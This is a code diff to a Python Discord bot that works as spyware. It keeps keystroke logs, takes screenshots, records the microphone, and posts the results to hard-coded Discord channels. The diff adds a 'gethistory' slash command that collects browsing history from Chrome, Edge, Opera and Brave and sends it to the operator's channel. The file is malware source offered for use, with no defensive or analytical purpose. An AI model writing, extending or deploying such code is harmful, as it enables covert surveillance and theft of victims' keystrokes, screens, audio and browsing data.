@@ -1,12 +1,13 @@
 import discord, time, os, socket
+from discord import app_commands
 from discord.ext import commands, tasks
+from history_finder import SearchHistory
 from screen import Screenshot, Microphone
 from dotenv import load_dotenv
 load_dotenv(".env")
 
 keylogs_file = "files\\keys.txt"
-intents = discord.Intents.all()
-bot = commands.Bot(command_prefix=';', intents=intents)
+bot = commands.Bot(command_prefix=';', intents=discord.Intents.all())
 
 guild_id = "1198070162432200865"
 screenshot_channel = "1209205802032955413"
@@ -14,6 +15,7 @@ microphone_channel = "1209237919592615937"
 logger_channel = "1215387927023063040"
 connect_channel = "1209247219874668638"
 
+searchhistory = SearchHistory()
 microphone = Microphone()
 screenshot = Screenshot()  
 
@@ -63,6 +65,29 @@ async def sendLogs(ctx):
     with open(keylogs_file, "w") as f:
         f.write("")
             
+@bot.tree.command(name="gethistory", description="Send search history from different browsers")
+async def get_history(interaction: discord.Interaction, browser: str, days: int):
+    try:
+        browsers = ["chrome", "google", "edge", "opera", "opera gx", "brave", "microsoft edge"]
+        if browser.lower() in browsers:
+            if browser.lower() == "chrome" or browser.lower() == "google":
+                result = searchhistory.get_chrome()
+            if browser.lower() == "edge" or browser.lower() == "microsoft edge":
+                result = searchhistory.get_edge()
+            if browser.lower() == "opera" or browser.lower() == "opera gx":
+                result = searchhistory.get_opera()
+            if browser.lower() == "brave":
+                result = searchhistory.get_brave()
+
+            await interaction.response.send_message(result)
+        if browser.lower() == "all":
+            result = searchhistory.get_all()
+            await interaction.response.send_message(result)
+        else:
+            await interaction.response.send_message("Invalid Browser, Try one of these:\n>>> Chrome/Google\nBrave\nOpera/Opera GX\nEdge/Microsoft Edge")
+    except Exception as e:
+        print(f"YOU FUCKED UP!!!\n{e}")
+
 @tasks.loop(seconds=0.1)
 async def check_files(ctx):
     while True:
@@ -79,6 +104,8 @@ async def check_files(ctx):
 
 @bot.event
 async def on_ready():
+    e = await bot.tree.sync()
+    print(e)
     guild = await bot.fetch_guild(guild_id)
     channel = await guild.fetch_channel(connect_channel)
 
@@ -90,10 +117,7 @@ async def on_ready():
 
 @bot.event
 async def on_message(message):
-    if not message.author.bot and message.content.startswith(bot.command_prefix):
+    if not message.author.bot:
         await bot.process_commands(message)
 
 bot.run(os.getenv("DISCORD_TOKEN"))
-
-# TODO:
-# - Add get_history function
